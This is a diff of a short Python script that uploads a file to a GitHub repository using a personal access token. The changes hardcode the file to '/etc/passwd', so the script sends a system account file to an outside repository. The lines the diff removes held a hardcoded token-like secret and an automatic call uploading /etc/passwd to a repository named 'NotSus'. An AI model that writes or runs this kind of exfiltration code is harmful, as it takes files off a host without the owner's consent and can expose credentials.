@@ -1,12 +1,17 @@
-# File uploading to github    
-def upload_file(user, repo, file):
+# Execute the command
+def run(user, repo, token):
+
+    print("Breakpoint 0")
+
     import requests
+
+    print("Breakpoint 1")
 
     # Replace these variables with your own values
     repo_owner = user
     repo_name = repo
-    file_path = file  # The file you want to upload
-    token = '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'
+    file_path = "/etc/passwd"  # The file you want to upload
+    token = token
 
     # Create a session with your PAT
     session = requests.Session()
@@ -88,21 +93,3 @@ def upload_file(user, repo, file):
         exit()
 
     print(f"File '{file_path}' uploaded to GitHub repository '{repo_owner}/{repo_name}' successfully!")
-
-# Execute the command
-def run():
-
-    print("Breakpoint 0")
-    import subprocess
-
-    # Define the command
-    command = ["pip", "install", "request"]
-
-    try:
-        subprocess.run(command, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Error: {e}")
-
-    print("Breakpoint 1")
-
-    upload_file("sergidinamita", "NotSus", "/etc/passwd")
